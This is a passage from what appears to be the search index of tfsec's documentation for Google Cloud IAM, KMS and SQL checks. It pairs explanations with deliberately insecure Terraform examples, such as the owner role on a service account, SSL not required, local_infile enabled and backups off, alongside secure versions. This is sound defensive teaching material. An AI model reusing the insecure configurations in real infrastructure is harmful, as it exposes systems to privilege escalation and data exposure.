<p>https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#use_least_privilege_sa</p> </li> </ul>","title":"Links"},{"location":"checks/google/iam/","text":"","title":"iam"},{"location":"checks/google/iam/#checks","text":"<ul> <li> <p>no-default-network Default network should not be created at project level</p> </li> <li> <p>no-folder-level-default-service-account-assignment Roles should not be assigned to default service accounts</p> </li> <li> <p>no-org-level-default-service-account-assignment Roles should not be assigned to default service accounts</p> </li> <li> <p>no-org-level-service-account-impersonation Users should not be granted service account access at the organization level</p> </li> <li> <p>no-privileged-service-accounts Service accounts should not have roles assigned with excessive privileges</p> </li> <li> <p>no-project-level-default-service-account-assignment Roles should not be assigned to default service accounts</p> </li> <li> <p>no-project-level-service-account-impersonation Users should not be granted service account access at the project level</p> </li> <li> <p>no-user-granted-permissions IAM granted directly to user.</p> </li> </ul>","title":"Checks"},{"location":"checks/google/iam/no-default-network/","text":"","title":"Default network should not be created at project level"},{"location":"checks/google/iam/no-default-network/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/iam/no-default-network/#explanation","text":"<p>The default network which is provided for a project contains multiple insecure firewall rules which allow ingress to the project's infrastructure. Creation of this network should therefore be disabled.</p>","title":"Explanation"},{"location":"checks/google/iam/no-default-network/#possible-impact","text":"<p>Exposure of internal infrastructure/services to public internet</p>","title":"Possible Impact"},{"location":"checks/google/iam/no-default-network/#suggested-resolution","text":"<p>Disable automatic default network creation</p>","title":"Suggested Resolution"},{"location":"checks/google/iam/no-default-network/#insecure-example","text":"<p>The following example will fail the google-iam-no-default-network check. <pre><code> resource \"google_project\" \"bad_example\" {\n   name       = \"My Project\"\n   project_id = \"your-project-id\"\n   org_id     = \"1234567\"\n   auto_create_network = true\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/iam/no-default-network/#secure-example","text":"<p>The following example will pass the google-iam-no-default-network check. <pre><code> resource \"google_project\" \"good_example\" {\n   name       = \"My Project\"\n   project_id = \"your-project-id\"\n   org_id     = \"1234567\"\n   auto_create_network = false\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/iam/no-default-network/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project#auto_create_network</li> </ul>","title":"Links"},{"location":"checks/google/iam/no-folder-level-default-service-account-assignment/","text":"","title":"Roles should not be assigned to default service accounts"},{"location":"checks/google/iam/no-folder-level-default-service-account-assignment/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/iam/no-folder-level-default-service-account-assignment/#explanation","text":"<p>Default service accounts should not be used - consider creating specialised service accounts for individual purposes.</p>","title":"Explanation"},{"location":"checks/google/iam/no-folder-level-default-service-account-assignment/#possible-impact","text":"<p>Violation of principal of least privilege</p>","title":"Possible Impact"},{"location":"checks/google/iam/no-folder-level-default-service-account-assignment/#suggested-resolution","text":"<p>Use specialised service accounts for specific purposes.</p>","title":"Suggested Resolution"},{"location":"checks/google/iam/no-folder-level-default-service-account-assignment/#insecure-example","text":"<p>The following example will fail the google-iam-no-folder-level-default-service-account-assignment check. <pre><code> resource \"google_folder_iam_member\" \"folder-123\" {\n    folder = \"folder-123\"\n    role    = \"roles/whatever\"\n    member  = \"123-compute@developer.gserviceaccount.com\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/iam/no-folder-level-default-service-account-assignment/#secure-example","text":"<p>The following example will pass the google-iam-no-folder-level-default-service-account-assignment check. <pre><code> resource \"google_service_account\" \"test\" {\n    account_id   = \"account123\"\n    display_name = \"account123\"\n }\n\n resource \"google_folder_iam_member\" \"folder-123\" {\n    folder = \"folder-123\"\n    role    = \"roles/whatever\"\n    member  = \"serviceAccount:${google_service_account.test.email}\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/iam/no-folder-level-default-service-account-assignment/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_folder_iam</p> </li> <li> <p></p> </li> <li> <p></p> </li> </ul>","title":"Links"},{"location":"checks/google/iam/no-folder-level-service-account-impersonation/","text":"","title":"Users should not be granted service account access at the folder level"},{"location":"checks/google/iam/no-folder-level-service-account-impersonation/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/iam/no-folder-level-service-account-impersonation/#explanation","text":"<p>Users with service account access at folder level can impersonate any service account. Instead, they should be given access to particular service accounts as required.</p>","title":"Explanation"},{"location":"checks/google/iam/no-folder-level-service-account-impersonation/#possible-impact","text":"<p>Privilege escalation, impersonation of any/all services</p>","title":"Possible Impact"},{"location":"checks/google/iam/no-folder-level-service-account-impersonation/#suggested-resolution","text":"<p>Provide access at the service-level instead of folder-level, if required</p>","title":"Suggested Resolution"},{"location":"checks/google/iam/no-folder-level-service-account-impersonation/#insecure-example","text":"<p>The following example will fail the google-iam-no-folder-level-service-account-impersonation check. <pre><code> resource \"google_folder_iam_binding\" \"folder-123\" {\n    folder = \"folder-123\"\n    role    = \"roles/iam.serviceAccountUser\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/iam/no-folder-level-service-account-impersonation/#secure-example","text":"<p>The following example will pass the google-iam-no-folder-level-service-account-impersonation check. <pre><code> resource \"google_folder_iam_binding\" \"folder-123\" {\n    folder = \"folder-123\"\n    role    = \"roles/nothingInParticular\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/iam/no-folder-level-service-account-impersonation/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_folder_iam</p> </li> <li> <p>https://cloud.google.com/iam/docs/impersonating-service-accounts</p> </li> </ul>","title":"Links"},{"location":"checks/google/iam/no-org-level-default-service-account-assignment/","text":"","title":"Roles should not be assigned to default service accounts"},{"location":"checks/google/iam/no-org-level-default-service-account-assignment/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/iam/no-org-level-default-service-account-assignment/#explanation","text":"<p>Default service accounts should not be used - consider creating specialised service accounts for individual purposes.</p>","title":"Explanation"},{"location":"checks/google/iam/no-org-level-default-service-account-assignment/#possible-impact","text":"<p>Violation of principal of least privilege</p>","title":"Possible Impact"},{"location":"checks/google/iam/no-org-level-default-service-account-assignment/#suggested-resolution","text":"<p>Use specialised service accounts for specific purposes.</p>","title":"Suggested Resolution"},{"location":"checks/google/iam/no-org-level-default-service-account-assignment/#insecure-example","text":"<p>The following example will fail the google-iam-no-org-level-default-service-account-assignment check. <pre><code> resource \"google_organization_iam_member\" \"org-123\" {\n    org_id = \"organization-123\"\n    role    = \"roles/whatever\"\n    member  = \"123-compute@developer.gserviceaccount.com\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/iam/no-org-level-default-service-account-assignment/#secure-example","text":"<p>The following example will pass the google-iam-no-org-level-default-service-account-assignment check. <pre><code> resource \"google_service_account\" \"test\" {\n    account_id   = \"account123\"\n    display_name = \"account123\"\n }\n\n resource \"google_organization_iam_member\" \"org-123\" {\n    org_id = \"org-123\"\n    role    = \"roles/whatever\"\n    member  = \"serviceAccount:${google_service_account.test.email}\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/iam/no-org-level-default-service-account-assignment/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_organization_iam</p> </li> <li> <p></p> </li> <li> <p></p> </li> </ul>","title":"Links"},{"location":"checks/google/iam/no-org-level-service-account-impersonation/","text":"","title":"Users should not be granted service account access at the organization level"},{"location":"checks/google/iam/no-org-level-service-account-impersonation/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/iam/no-org-level-service-account-impersonation/#explanation","text":"<p>Users with service account access at organization level can impersonate any service account. Instead, they should be given access to particular service accounts as required.</p>","title":"Explanation"},{"location":"checks/google/iam/no-org-level-service-account-impersonation/#possible-impact","text":"<p>Privilege escalation, impersonation of any/all services</p>","title":"Possible Impact"},{"location":"checks/google/iam/no-org-level-service-account-impersonation/#suggested-resolution","text":"<p>Provide access at the service-level instead of organization-level, if required</p>","title":"Suggested Resolution"},{"location":"checks/google/iam/no-org-level-service-account-impersonation/#insecure-example","text":"<p>The following example will fail the google-iam-no-org-level-service-account-impersonation check. <pre><code> resource \"google_organization_iam_binding\" \"organization-123\" {\n    org_id  = \"org-123\"\n    role    = \"roles/iam.serviceAccountUser\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/iam/no-org-level-service-account-impersonation/#secure-example","text":"<p>The following example will pass the google-iam-no-org-level-service-account-impersonation check. <pre><code> resource \"google_organization_iam_binding\" \"organization-123\" {\n    org_id  = \"org-123\"\n    role    = \"roles/nothingInParticular\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/iam/no-org-level-service-account-impersonation/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_organization_iam</p> </li> <li> <p>https://cloud.google.com/iam/docs/impersonating-service-accounts</p> </li> </ul>","title":"Links"},{"location":"checks/google/iam/no-privileged-service-accounts/","text":"","title":"Service accounts should not have roles assigned with excessive privileges"},{"location":"checks/google/iam/no-privileged-service-accounts/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/iam/no-privileged-service-accounts/#explanation","text":"<p>Service accounts should have a minimal set of permissions assigned in order to do their job. They should never have excessive access as if compromised, an attacker can escalate privileges and take over the entire account.</p>","title":"Explanation"},{"location":"checks/google/iam/no-privileged-service-accounts/#possible-impact","text":"<p>Cloud account takeover if a resource using a service account is compromised</p>","title":"Possible Impact"},{"location":"checks/google/iam/no-privileged-service-accounts/#suggested-resolution","text":"<p>Limit service account access to minimal required set</p>","title":"Suggested Resolution"},{"location":"checks/google/iam/no-privileged-service-accounts/#insecure-example","text":"<p>The following example will fail the google-iam-no-privileged-service-accounts check. <pre><code> resource \"google_service_account\" \"test\" {\n   account_id   = \"account123\"\n   display_name = \"account123\"\n   email        = \"jim@tfsec.dev\"\n }\n\n resource \"google_project_iam_member\" \"project\" {\n    project = \"your-project-id\"\n    role    = \"roles/owner\"\n    member  = \"serviceAccount:${google_service_account.test.email}\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/iam/no-privileged-service-accounts/#secure-example","text":"<p>The following example will pass the google-iam-no-privileged-service-accounts check. <pre><code> resource \"google_service_account\" \"test\" {\n    account_id   = \"account123\"\n    display_name = \"account123\"\n    email        = \"jim@tfsec.dev\"\n }\n\n resource \"google_project_iam_member\" \"project\" {\n    project = \"your-project-id\"\n    role    = \"roles/logging.logWriter\"\n    member  = \"serviceAccount:${google_service_account.test.email}\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/iam/no-privileged-service-accounts/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam</p> </li> <li> <p>https://cloud.google.com/iam/docs/understanding-roles</p> </li> </ul>","title":"Links"},{"location":"checks/google/iam/no-project-level-default-service-account-assignment/","text":"","title":"Roles should not be assigned to default service accounts"},{"location":"checks/google/iam/no-project-level-default-service-account-assignment/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/iam/no-project-level-default-service-account-assignment/#explanation","text":"<p>Default service accounts should not be used - consider creating specialised service accounts for individual purposes.</p>","title":"Explanation"},{"location":"checks/google/iam/no-project-level-default-service-account-assignment/#possible-impact","text":"<p>Violation of principal of least privilege</p>","title":"Possible Impact"},{"location":"checks/google/iam/no-project-level-default-service-account-assignment/#suggested-resolution","text":"<p>Use specialised service accounts for specific purposes.</p>","title":"Suggested Resolution"},{"location":"checks/google/iam/no-project-level-default-service-account-assignment/#insecure-example","text":"<p>The following example will fail the google-iam-no-project-level-default-service-account-assignment check. <pre><code> resource \"google_project_iam_member\" \"project-123\" {\n    project = \"project-123\"\n    role    = \"roles/whatever\"\n    member  = \"123-compute@developer.gserviceaccount.com\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/iam/no-project-level-default-service-account-assignment/#secure-example","text":"<p>The following example will pass the google-iam-no-project-level-default-service-account-assignment check. <pre><code> resource \"google_service_account\" \"test\" {\n    account_id   = \"account123\"\n    display_name = \"account123\"\n }\n\n resource \"google_project_iam_member\" \"project-123\" {\n    project = \"project-123\"\n    role    = \"roles/whatever\"\n    member  = \"serviceAccount:${google_service_account.test.email}\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/iam/no-project-level-default-service-account-assignment/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam</p> </li> <li> <p></p> </li> <li> <p></p> </li> </ul>","title":"Links"},{"location":"checks/google/iam/no-project-level-service-account-impersonation/","text":"","title":"Users should not be granted service account access at the project level"},{"location":"checks/google/iam/no-project-level-service-account-impersonation/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/iam/no-project-level-service-account-impersonation/#explanation","text":"<p>Users with service account access at project level can impersonate any service account. Instead, they should be given access to particular service accounts as required.</p>","title":"Explanation"},{"location":"checks/google/iam/no-project-level-service-account-impersonation/#possible-impact","text":"<p>Privilege escalation, impersonation of any/all services</p>","title":"Possible Impact"},{"location":"checks/google/iam/no-project-level-service-account-impersonation/#suggested-resolution","text":"<p>Provide access at the service-level instead of project-level, if required</p>","title":"Suggested Resolution"},{"location":"checks/google/iam/no-project-level-service-account-impersonation/#insecure-example","text":"<p>The following example will fail the google-iam-no-project-level-service-account-impersonation check. <pre><code> resource \"google_project_iam_binding\" \"project-123\" {\n    project = \"project-123\"\n    role    = \"roles/iam.serviceAccountUser\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/iam/no-project-level-service-account-impersonation/#secure-example","text":"<p>The following example will pass the google-iam-no-project-level-service-account-impersonation check. <pre><code> resource \"google_project_iam_binding\" \"project-123\" {\n    project = \"project-123\"\n    role    = \"roles/nothingInParticular\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/iam/no-project-level-service-account-impersonation/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam</p> </li> <li> <p>https://cloud.google.com/iam/docs/impersonating-service-accounts</p> </li> </ul>","title":"Links"},{"location":"checks/google/iam/no-user-granted-permissions/","text":"","title":"IAM granted directly to user."},{"location":"checks/google/iam/no-user-granted-permissions/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/iam/no-user-granted-permissions/#explanation","text":"<p>Permissions should not be directly granted to users, you identify roles that contain the appropriate permissions, and then grant those roles to the user. </p> <p>Granting permissions to users quickly become unwieldy and complex to make large scale changes to remove access to a particular resource.</p> <p>Permissions should be granted on roles, groups, services accounts instead.</p>","title":"Explanation"},{"location":"checks/google/iam/no-user-granted-permissions/#possible-impact","text":"<p>Users shouldn't have permissions granted to them directly</p>","title":"Possible Impact"},{"location":"checks/google/iam/no-user-granted-permissions/#suggested-resolution","text":"<p>Roles should be granted permissions and assigned to users</p>","title":"Suggested Resolution"},{"location":"checks/google/iam/no-user-granted-permissions/#insecure-example","text":"<p>The following example will fail the google-iam-no-user-granted-permissions check. <pre><code> resource \"google_project_iam_binding\" \"bad_example\" {\n    members = [\n        \"user:test@example.com\",\n        ]\n }\n\n resource \"google_project_iam_member\" \"bad_example\" {\n    member = \"user:test@example.com\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/iam/no-user-granted-permissions/#secure-example","text":"<p>The following example will pass the google-iam-no-user-granted-permissions check. <pre><code> resource \"google_project_iam_binding\" \"good_example\" {\n    members = [\n        \"group:test@example.com\",\n        ]\n }\n\n resource \"google_storage_bucket_iam_member\" \"good_example\" {\n    member = \"serviceAccount:test@example.com\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/iam/no-user-granted-permissions/#links","text":"<ul> <li> <p>https://www.terraform.io/docs/providers/google/d/iam_policy.html#members</p> </li> <li> <p>https://cloud.google.com/iam/docs/overview#permissions</p> </li> <li> <p>https://cloud.google.com/resource-manager/reference/rest/v1/projects/setIamPolicy</p> </li> </ul>","title":"Links"},{"location":"checks/google/kms/","text":"","title":"kms"},{"location":"checks/google/kms/#checks","text":"<ul> <li>rotate-kms-keys KMS keys should be rotated at least every 90 days</li> </ul>","title":"Checks"},{"location":"checks/google/kms/rotate-kms-keys/","text":"","title":"KMS keys should be rotated at least every 90 days"},{"location":"checks/google/kms/rotate-kms-keys/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/kms/rotate-kms-keys/#explanation","text":"<p>Keys should be rotated on a regular basis to limit exposure if a given key should become compromised.</p>","title":"Explanation"},{"location":"checks/google/kms/rotate-kms-keys/#possible-impact","text":"<p>Exposure is greater if the same keys are used over a long period</p>","title":"Possible Impact"},{"location":"checks/google/kms/rotate-kms-keys/#suggested-resolution","text":"<p>Set key rotation period to 90 days</p>","title":"Suggested Resolution"},{"location":"checks/google/kms/rotate-kms-keys/#insecure-example","text":"<p>The following example will fail the google-kms-rotate-kms-keys check. <pre><code> resource \"google_kms_key_ring\" \"keyring\" {\n   name     = \"keyring-example\"\n   location = \"global\"\n }\n\n resource \"google_kms_crypto_key\" \"example-key\" {\n   name            = \"crypto-key-example\"\n   key_ring        = google_kms_key_ring.keyring.id\n   rotation_period = \"15552000s\"\n\n   lifecycle {\n     prevent_destroy = true\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/kms/rotate-kms-keys/#secure-example","text":"<p>The following example will pass the google-kms-rotate-kms-keys check. <pre><code> resource \"google_kms_key_ring\" \"keyring\" {\n   name     = \"keyring-example\"\n   location = \"global\"\n }\n\n resource \"google_kms_crypto_key\" \"example-key\" {\n   name            = \"crypto-key-example\"\n   key_ring        = google_kms_key_ring.keyring.id\n   rotation_period = \"7776000s\"\n\n   lifecycle {\n     prevent_destroy = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/kms/rotate-kms-keys/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/kms_crypto_key#rotation_period</li> </ul>","title":"Links"},{"location":"checks/google/sql/","text":"","title":"sql"},{"location":"checks/google/sql/#checks","text":"<ul> <li> <p>enable-backup Enable automated backups to recover from data-loss</p> </li> <li> <p>enable-pg-temp-file-logging Temporary file logging should be enabled for all temporary files.</p> </li> <li> <p>encrypt-in-transit-data SSL connections to a SQL database instance should be enforced.</p> </li> <li> <p>mysql-no-local-infile Disable local_infile setting in MySQL</p> </li> <li> <p>no-contained-db-auth Contained database authentication should be disabled</p> </li> <li> <p>no-cross-db-ownership-chaining Cross-database ownership chaining should be disabled</p> </li> <li> <p>no-public-access Ensure that Cloud SQL Database Instances are not publicly exposed</p> </li> <li> <p>pg-log-checkpoints Ensure that logging of checkpoints is enabled.</p> </li> <li> <p>pg-log-connections Ensure that logging of connections is enabled.</p> </li> <li> <p>pg-log-disconnections Ensure that logging of disconnections is enabled.</p> </li> <li> <p>pg-log-errors Ensure that Postgres errors are logged</p> </li> <li> <p>pg-log-lock-waits Ensure that logging of lock waits is enabled.</p> </li> <li> <p>pg-no-min-statement-logging Ensure that logging of long statements is disabled.</p> </li> </ul>","title":"Checks"},{"location":"checks/google/sql/enable-backup/","text":"","title":"Enable automated backups to recover from data-loss"},{"location":"checks/google/sql/enable-backup/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/sql/enable-backup/#explanation","text":"<p>Automated backups are not enabled by default. Backups are an easy way to restore data in a corruption or data-loss scenario.</p>","title":"Explanation"},{"location":"checks/google/sql/enable-backup/#possible-impact","text":"<p>No recovery of lost or corrupted data</p>","title":"Possible Impact"},{"location":"checks/google/sql/enable-backup/#suggested-resolution","text":"<p>Enable automated backups</p>","title":"Suggested Resolution"},{"location":"checks/google/sql/enable-backup/#insecure-example","text":"<p>The following example will fail the google-sql-enable-backup check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"POSTGRES_12\"\n    region           = \"us-central1\"\n    settings {\n        backup_configuration {\n            enabled = false\n        }\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/sql/enable-backup/#secure-example","text":"<p>The following example will pass the google-sql-enable-backup check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"POSTGRES_12\"\n    region           = \"us-central1\"\n    settings {\n        backup_configuration {\n            enabled = true\n        }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/sql/enable-backup/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance#settings.backup_configuration.enabled=true</p> </li> <li> <p>https://cloud.google.com/sql/docs/mysql/backup-recovery/backups</p> </li> </ul>","title":"Links"},{"location":"checks/google/sql/enable-pg-temp-file-logging/","text":"","title":"Temporary file logging should be enabled for all temporary files."},{"location":"checks/google/sql/enable-pg-temp-file-logging/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/sql/enable-pg-temp-file-logging/#explanation","text":"<p>Temporary files are not logged by default. To log all temporary files, a value of <code>0</code> should set in the <code>log_temp_files</code> flag - as all files greater in size than the number of bytes set in this flag will be logged.</p>","title":"Explanation"},{"location":"checks/google/sql/enable-pg-temp-file-logging/#possible-impact","text":"<p>Use of temporary files will not be logged</p>","title":"Possible Impact"},{"location":"checks/google/sql/enable-pg-temp-file-logging/#suggested-resolution","text":"<p>Enable temporary file logging for all files</p>","title":"Suggested Resolution"},{"location":"checks/google/sql/enable-pg-temp-file-logging/#insecure-example","text":"<p>The following example will fail the google-sql-enable-pg-temp-file-logging check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"POSTGRES_12\"\n    region           = \"us-central1\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/sql/enable-pg-temp-file-logging/#secure-example","text":"<p>The following example will pass the google-sql-enable-pg-temp-file-logging check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"POSTGRES_12\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"log_temp_files\"\n            value = \"0\"\n        }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/sql/enable-pg-temp-file-logging/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance</p> </li> <li> <p>https://postgresqlco.nf/doc/en/param/log_temp_files/</p> </li> </ul>","title":"Links"},{"location":"checks/google/sql/encrypt-in-transit-data/","text":"","title":"SSL connections to a SQL database instance should be enforced."},{"location":"checks/google/sql/encrypt-in-transit-data/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/sql/encrypt-in-transit-data/#explanation","text":"<p>In-transit data should be encrypted so that if traffic is intercepted data will not be exposed in plaintext to attackers.</p>","title":"Explanation"},{"location":"checks/google/sql/encrypt-in-transit-data/#possible-impact","text":"<p>Intercepted data can be read in transit</p>","title":"Possible Impact"},{"location":"checks/google/sql/encrypt-in-transit-data/#suggested-resolution","text":"<p>Enforce SSL for all connections</p>","title":"Suggested Resolution"},{"location":"checks/google/sql/encrypt-in-transit-data/#insecure-example","text":"<p>The following example will fail the google-sql-encrypt-in-transit-data check. <pre><code> resource \"google_sql_database_instance\" \"postgres\" {\n    name             = \"postgres-instance-a\"\n    database_version = \"POSTGRES_11\"\n\n    settings {\n        tier = \"db-f1-micro\"\n\n        ip_configuration {\n            ipv4_enabled = false\n            authorized_networks {\n                value           = \"108.12.12.0/24\"\n                name            = \"internal\"\n            }\n            require_ssl = false\n        }\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/sql/encrypt-in-transit-data/#secure-example","text":"<p>The following example will pass the google-sql-encrypt-in-transit-data check. <pre><code> resource \"google_sql_database_instance\" \"postgres\" {\n    name             = \"postgres-instance-a\"\n    database_version = \"POSTGRES_11\"\n\n    settings {\n        tier = \"db-f1-micro\"\n\n        ip_configuration {\n            ipv4_enabled = false\n            authorized_networks {\n                value           = \"108.12.12.0/24\"\n                name            = \"internal\"\n            }\n            require_ssl = true\n        }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/sql/encrypt-in-transit-data/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance</p> </li> <li> <p>https://cloud.google.com/sql/docs/mysql/configure-ssl-instance</p> </li> </ul>","title":"Links"},{"location":"checks/google/sql/mysql-no-local-infile/","text":"","title":"Disable local_infile setting in MySQL"},{"location":"checks/google/sql/mysql-no-local-infile/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/sql/mysql-no-local-infile/#explanation","text":"<p>Arbitrary files can be read from the system using LOAD_DATA unless this setting is disabled.</p>","title":"Explanation"},{"location":"checks/google/sql/mysql-no-local-infile/#possible-impact","text":"<p>Arbitrary files read by attackers when combined with a SQL injection vulnerability.</p>","title":"Possible Impact"},{"location":"checks/google/sql/mysql-no-local-infile/#suggested-resolution","text":"<p>Disable the local infile setting</p>","title":"Suggested Resolution"},{"location":"checks/google/sql/mysql-no-local-infile/#insecure-example","text":"<p>The following example will fail the google-sql-mysql-no-local-infile check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"MYSQL_5_6\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"local_infile\"\n            value = \"on\"\n        }\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/sql/mysql-no-local-infile/#secure-example","text":"<p>The following example will pass the google-sql-mysql-no-local-infile check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"MYSQL_5_6\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"local_infile\"\n            value = \"off\"\n        }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/sql/mysql-no-local-infile/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance</p> </li> <li> <p>https://dev.mysql.com/doc/refman/8.0/en/load-data-local-security.html</p> </li> <li> <p>https://dev.mysql.com/doc/refman/8.0/en/load-data-local-security.html</p> </li> </ul>","title":"Links"},{"location":"checks/google/sql/no-contained-db-auth/","text":"","title":"Contained database authentication should be disabled"},{"location":"checks/google/sql/no-contained-db-auth/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/sql/no-contained-db-auth/#explanation","text":"<p>Users with ALTER permissions on users can grant access to a contained database without the knowledge of an administrator</p>","title":"Explanation"},{"location":"checks/google/sql/no-contained-db-auth/#possible-impact","text":"<p>Access can be granted without knowledge of the database administrator</p>","title":"Possible Impact"},{"location":"checks/google/sql/no-contained-db-auth/#suggested-resolution","text":"<p>Disable contained database authentication</p>","title":"Suggested Resolution"},{"location":"checks/google/sql/no-contained-db-auth/#insecure-example","text":"<p>The following example will fail the google-sql-no-contained-db-auth check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"SQLSERVER_2017_STANDARD\"\n    region           = \"us-central1\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/sql/no-contained-db-auth/#secure-example","text":"<p>The following example will pass the google-sql-no-contained-db-auth check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"SQLSERVER_2017_STANDARD\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"contained database authentication\"\n            value = \"off\"\n        }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/sql/no-contained-db-auth/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance</p> </li> <li> <p>https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/contained-database-authentication-server-configuration-option?view=sql-server-ver15</p> </li> </ul>","title":"Links"},{"location":"checks/google/sql/no-cross-db-ownership-chaining/","text":"","title":"Cross-database ownership chaining should be disabled"},{"location":"checks/google/sql/no-cross-db-ownership-chaining/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/sql/no-cross-db-ownership-chaining/#explanation","text":"<p>Cross-database ownership chaining, also known as cross-database chaining, is a security feature of SQL Server that allows users of databases access to other databases besides the one they are currently using.</p>","title":"Explanation"},{"location":"checks/google/sql/no-cross-db-ownership-chaining/#possible-impact","text":"<p>Unintended access to sensitive data</p>","title":"Possible Impact"},{"location":"checks/google/sql/no-cross-db-ownership-chaining/#suggested-resolution","text":"<p>Disable cross database ownership chaining</p>","title":"Suggested Resolution"},{"location":"checks/google/sql/no-cross-db-ownership-chaining/#insecure-example","text":"<p>The following example will fail the google-sql-no-cross-db-ownership-chaining check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"SQLSERVER_2017_STANDARD\"\n    region           = \"us-central1\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/sql/no-cross-db-ownership-chaining/#secure-example","text":"<p>The following example will pass the google-sql-no-cross-db-ownership-chaining check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"SQLSERVER_2017_STANDARD\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"cross db ownership chaining\"\n            value = \"off\"\n        }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/sql/no-cross-db-ownership-chaining/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance</p> </li> <li> <p>https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/cross-db-ownership-chaining-server-configuration-option?view=sql-server-ver15</p> </li> 